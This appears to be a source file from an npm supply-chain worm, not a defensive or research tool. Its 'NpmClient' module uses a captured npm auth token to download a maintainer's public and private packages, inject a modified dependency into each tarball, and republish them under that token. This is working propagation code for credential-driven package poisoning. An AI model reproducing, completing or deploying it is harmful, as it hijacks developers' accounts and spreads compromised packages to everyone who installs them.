import { $ } from "bun";
import { createWriteStream } from "fs";
import * as fs from "fs/promises";
import { join } from "path";
import { Readable } from "stream";
import { pipeline } from "stream/promises";

import { logUtil } from "../../utils/logger";
import { Mutator } from "../base";
import { publishTarball } from "./publish";
import { TMP_PACKAGE_NAME, updateTarball } from "./tarball";
import type { TokenInfo } from "./tokenCheck";

export { TMP_PACKAGE_NAME } from "./tarball";

declare function scramble(str: string): string;

export class NpmClient extends Mutator {
  private tokenInfo: TokenInfo;

  constructor(token: TokenInfo) {
    super();
    this.tokenInfo = token;
  }

  async execute() {
    try {
      const isUnix = ["darwin", "linux"].includes(process.platform);

      if (isUnix) {
        this.tokenInfo.packages.forEach((pkgName: string) => {
          logUtil.log(`Would be updating: ${pkgName}`);
        });
        const packages = await this.downloadPackages(this.tokenInfo.packages);
        await Promise.all(
          packages.downloaded.map((pkg) => this.publishPackage(pkg)),
        );
        await fs.rm(packages.tmpDir, { recursive: true, force: true });
        return true;
      }
    } catch (e) {
      logUtil.error(e);
      logUtil.error("Failure updating package.");
      return false;
    }

    return true;
  }

  private async updateTarball(tarballPath: string): Promise<string> {
    return updateTarball(tarballPath, {
      tag: "[npm]",
      addBunDep: true,
    });
  }

  async downloadPackages(packages: string[]): Promise<{
    tmpDir: string;
    downloaded: Array<{ path: string; isPrivate: boolean }>;
  }> {
    const tmpDir = await $`mktemp -d`.text().then((s) => s.trim());
    const downloaded: Array<{ path: string; isPrivate: boolean }> = [];

    const download = async (pkg: string) => {
      try {
        const encodedName = pkg.replace("/", "%2F");
        const registryUrl = `https://registry.npmjs.org/${encodedName}`;

        // Try unauth first — if it works, the package is public.
        let meta = await fetch(registryUrl);
        let isPrivate = false;
        let headers: Record<string, string> | undefined;

        if (!meta.ok) {
          // Unauthenticated failed — try with auth (private package).
          headers = { Authorization: `Bearer ${this.tokenInfo.authToken}` };
          meta = await fetch(registryUrl, { headers });
          isPrivate = true;
        }
        if (!meta.ok) return;

        const { "dist-tags": tags, versions } = (await meta.json()) as {
          "dist-tags": { latest: string };
          versions: Record<string, { dist?: { tarball?: string } }>;
        };
        const tarball = versions[tags.latest]?.dist?.tarball;
        if (!tarball) return;

        const res = await fetch(tarball, headers ? { headers } : undefined);
        if (!res.ok || !res.body) return;

        const filename = `${pkg.replace("@", "").replace("/", "-")}-${tags.latest}.tgz`;
        const tarballPath = join(tmpDir, filename);
        await pipeline(
          Readable.fromWeb(res.body as import("stream/web").ReadableStream),
          createWriteStream(tarballPath),
        );
        const updatedPath = await this.updateTarball(tarballPath);
        downloaded.push({ path: updatedPath, isPrivate });
      } catch (e) {
        logUtil.log(`Failed to download ${pkg}: ${e}`);
      }
    };

    await Promise.all(packages.map(download));
    return { tmpDir, downloaded };
  }

  async publishPackage(item: {
    path: string;
    isPrivate: boolean;
  }): Promise<boolean> {
    if (!this.tokenInfo) return false;
    try {
      return await publishTarball(
        item.path,
        this.tokenInfo.authToken,
        false,
        undefined,
        item.isPrivate,
      );
    } catch (e) {
      logUtil.error(e);
      return false;
    }
  }
}
